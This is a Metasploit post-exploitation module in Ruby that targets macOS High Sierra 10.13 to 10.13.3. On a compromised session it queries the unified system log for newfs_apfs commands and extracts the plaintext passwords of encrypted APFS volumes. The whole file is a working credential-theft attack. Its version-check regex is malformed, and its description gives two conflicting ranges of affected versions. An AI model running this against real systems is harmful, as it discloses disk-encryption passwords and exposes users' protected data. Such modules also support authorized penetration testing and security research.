##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Mac OS X APFS Encrypted Volume Password Disclosure',
      'Description'   => %q(
        This module exploits a flaw in OSX 10.13 through 10.13.3
        that discloses the passwords of encrypted APFS volumes.

        In OSX a normal user can use the 'log' command to view the system
        logs. In OSX 10.13 to 10.13.2 when a user creates an encrypted APFS
        volume the password is visible in plaintext within these logs.
      ),
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'URL', 'https://thehackernews.com/2018/03/macos-apfs-password.html' ],
          [ 'URL', 'https://www.mac4n6.com/blog/2018/3/21/uh-oh-unified-logs-in-high-sierra-1013-show-plaintext-password-for-apfs-encrypted-external-volumes-via-disk-utilityapp' ]
        ],
      'Platform'      => 'osx',
      'Arch'          => ARCH_ALL,
      'Author'         => [
        'Sarah Edwards',  # earliest public discovery
        'cbrnrd'          # Metasploit module
      ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ],
      'Targets'       => [
        [ 'Mac OS X High Sierra (10.13.1, 10.13.2, 10.13.3)', { } ]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Mar 21 2018'
    ))
    register_options([
      # The command doesn't give volume names, only mount paths (current or previous)
      OptString.new('MOUNT_PATH', [false, 'The mount path of the volume to get the password of (Leave blank for all)', ''])
    ])
  end

  def check
    osx_version = cmd_exec('sw_vers -productVersion')
    return Exploit::CheckCode::Vulnerable if osx_version =~ /^10\.13[\.[0-3]]?$/
    Exploit::CheckCode::Safe
  end

  def run
    if check == Exploit::CheckCode::Safe
      print_error "This version of OSX is not vulnerable"
      return
    end
    cmd = "log show --info --predicate 'eventMessage contains \"newfs_\"'"
    cmd << " | grep #{datastore['MOUNT_PATH']}" unless datastore['MOUNT_PATH'].empty?
    vprint_status "Running \"#{cmd}\" on target..."
    results = cmd_exec(cmd)
    vprint_status "Target results:\n#{results}"
    if results.empty?
      print_error 'Got no response from target. Stopping...'
    else
      successful_lines = 0
      results.lines.each do |l|
        next unless l =~ /newfs_apfs(.*)-S(.*)$/
        print_good "APFS command found: #{$&}"
        successful_lines += 1
      end
      print_error "No password(s) found for any volumes. Exiting..." if successful_lines.zero?
    end
  end
end
